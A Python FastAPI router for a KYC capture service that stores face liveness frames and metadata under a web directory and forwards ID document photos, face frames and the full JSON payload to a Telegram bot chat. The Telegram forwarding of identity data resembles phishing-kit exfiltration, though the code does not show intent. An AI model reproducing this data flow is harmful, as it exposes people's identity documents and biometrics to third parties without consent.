"""
POST /api/v1/save   — persist captures + Telegram notification
POST /api/v1/mrz    — passport MRZ only (no face match)
"""

from __future__ import annotations

import base64
import binascii
import json
import logging
import os
import threading
from datetime import datetime
from pathlib import Path
from typing import Any

from fastapi import APIRouter, HTTPException, Request

log = logging.getLogger(__name__)

router = APIRouter(tags=["capture"])

_SAVES_DIR     = Path(__file__).resolve().parents[2] / "web" / "captures"
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT  = os.getenv("TELEGRAM_CHAT_ID",   "")


# ── Helpers ───────────────────────────────────────────────────────────────────

def _decode_uri(uri: str) -> bytes | None:
    if not isinstance(uri, str) or not uri.strip():
        return None
    payload = uri.split(",", 1)[1] if "," in uri else uri
    try:
        return base64.b64decode(payload)
    except (binascii.Error, ValueError):
        return None


def _slugify(value: str) -> str:
    if not isinstance(value, str) or not value:
        return "frame"
    cleaned = "".join(ch.lower() if ch.isalnum() else "_" for ch in value)
    return cleaned.strip("_") or "frame"


# ── Telegram ──────────────────────────────────────────────────────────────────

def _tg(method: str, **kwargs):
    if not TELEGRAM_TOKEN:
        return
    import urllib.request
    url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/{method}"
    try:
        try:
            import requests
            requests.post(url, timeout=15, **kwargs)
        except ImportError:
            data = json.dumps(kwargs.get("json", {})).encode()
            req  = urllib.request.Request(url, data=data,
                                          headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=15)
    except Exception as exc:
        log.warning("Telegram error: %s", exc)


def _send_photo(uri: str, caption: str):
    blob = _decode_uri(uri)
    if not blob:
        return
    try:
        import requests
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
            data={"chat_id": TELEGRAM_CHAT, "caption": caption},
            files={"photo": ("photo.jpg", blob, "image/jpeg")},
            timeout=15,
        )
    except Exception as exc:
        log.warning("Telegram photo error: %s", exc)


def _notify(data: dict):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT:
        return
    import requests as _req

    mode = data.get("mode", "unknown")
    ts   = data.get("captured_at") or data.get("timestamp") or "N/A"
    lines = [f"*KYC Capture* — `{mode}`", f"Time: `{ts}`"]
    if data.get("country"):
        lines.append(f"Country: `{data['country']}`")
    if data.get("doc_type"):
        lines.append(f"Doc type: `{data['doc_type']}`")
    challenges = data.get("challenges") or []
    if challenges:
        passed = sum(1 for c in challenges if c.get("status") == "done")
        lines.append(f"Challenges: `{passed}/{len(challenges)} passed`")

    base = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

    # 1. Text summary
    try:
        _req.post(f"{base}/sendMessage",
                  json={"chat_id": TELEGRAM_CHAT, "text": "\n".join(lines), "parse_mode": "Markdown"},
                  timeout=15)
    except Exception as exc:
        log.warning("Telegram text error: %s", exc)

    # 2. JSON payload as a document file
    try:
        safe_data = {k: v for k, v in data.items()
                     if k not in {"face_frame", "face_frames", "id_frame", "id_frame_back"}}
        json_bytes = json.dumps(safe_data, indent=2, ensure_ascii=False).encode("utf-8")
        _req.post(f"{base}/sendDocument",
                  data={"chat_id": TELEGRAM_CHAT, "caption": "Capture payload (images excluded)"},
                  files={"document": ("payload.json", json_bytes, "application/json")},
                  timeout=15)
    except Exception as exc:
        log.warning("Telegram JSON doc error: %s", exc)

    # 3. ID document photo(s)
    for field, caption in [("id_frame", "ID — front"), ("id_frame_back", "ID — back")]:
        blob = _decode_uri(data.get(field) or "")
        if not blob:
            continue
        try:
            _req.post(f"{base}/sendPhoto",
                      data={"chat_id": TELEGRAM_CHAT, "caption": caption},
                      files={"photo": (f"{field}.jpg", blob, "image/jpeg")},
                      timeout=20)
        except Exception as exc:
            log.warning("Telegram ID photo error: %s", exc)

    # 4. All liveness frames as a media group (album), max 10
    face_uris = data.get("face_frames") or []
    if not face_uris and data.get("face_frame"):
        face_uris = [data["face_frame"]]
    face_uris = [u for u in face_uris if u][:10]

    if len(face_uris) == 1:
        blob = _decode_uri(face_uris[0])
        if blob:
            try:
                _req.post(f"{base}/sendPhoto",
                          data={"chat_id": TELEGRAM_CHAT, "caption": "Liveness frame 1"},
                          files={"photo": ("face_1.jpg", blob, "image/jpeg")},
                          timeout=20)
            except Exception as exc:
                log.warning("Telegram face photo error: %s", exc)
    elif len(face_uris) > 1:
        # Decode all blobs first; skip any that fail
        blobs = []
        for uri in face_uris:
            b = _decode_uri(uri)
            if b:
                blobs.append(b)

        if blobs:
            try:
                media   = [{"type": "photo", "media": f"attach://face_{i}"} for i in range(len(blobs))]
                media[0]["caption"] = f"Liveness frames ({len(blobs)} captured)"
                files   = {f"face_{i}": (f"face_{i}.jpg", b, "image/jpeg") for i, b in enumerate(blobs)}
                _req.post(f"{base}/sendMediaGroup",
                          data={"chat_id": TELEGRAM_CHAT,
                                "media":   json.dumps(media)},
                          files=files,
                          timeout=30)
            except Exception as exc:
                log.warning("Telegram media group error: %s", exc)


# ── Save capture ──────────────────────────────────────────────────────────────

def _save_capture(data: dict) -> list[str]:
    _SAVES_DIR.mkdir(parents=True, exist_ok=True)
    ts    = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    saved = []

    frames = data.get("face_frames")
    if not isinstance(frames, list):
        frames = []
    if not frames and data.get("face_frame"):
        frames = [data["face_frame"]]

    pack         = data.get("capture_pack") or []
    saved_frames = []

    for idx, uri in enumerate(frames):
        blob = _decode_uri(uri)
        if not blob:
            continue
        meta = pack[idx] if idx < len(pack) and isinstance(pack[idx], dict) else {}
        safe = _slugify(meta.get("type") or f"frame_{idx + 1}")
        path = _SAVES_DIR / f"{ts}_{idx + 1:02d}_{safe}.jpg"
        path.write_bytes(blob)
        saved.append(path.name)
        saved_frames.append({"index": idx, "type": meta.get("type"),
                              "label": meta.get("label"), "file": path.name})

    meta_data = {k: v for k, v in data.items()
                 if k not in {"face_frame", "face_frames", "id_frame"}}
    meta_data["saved_frames"] = saved_frames
    meta_path = _SAVES_DIR / f"{ts}_meta.json"
    meta_path.write_text(json.dumps(meta_data, indent=2), encoding="utf-8")
    saved.append(meta_path.name)
    return saved


# ── Routes ────────────────────────────────────────────────────────────────────

@router.post("/save")
async def save(request: Request):
    """Persist KYC capture frames + metadata, notify Telegram."""
    try:
        payload = await request.json()
    except Exception:
        raise HTTPException(400, "Invalid JSON body")

    try:
        files = _save_capture(payload)
    except Exception as exc:
        log.error("save_capture error: %s", exc)
        raise HTTPException(500, str(exc))

    threading.Thread(target=_notify, args=(payload,), daemon=True).start()
    return {"ok": True, "files": files}


@router.post("/mrz")
async def mrz(request: Request):
    """Extract and validate passport MRZ from a base64 data-URI."""
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(400, "Invalid JSON body")

    id_uri = body.get("id_frame")
    if not id_uri:
        raise HTTPException(400, "id_frame is required")

    try:
        from production.matcher.mrz import verify_passport
        result = verify_passport(id_uri)
    except ImportError:
        raise HTTPException(503, "MRZ module not available (opencv/pytesseract not installed)")
    except Exception as exc:
        log.error("MRZ error: %s", exc)
        raise HTTPException(500, str(exc))

    return result
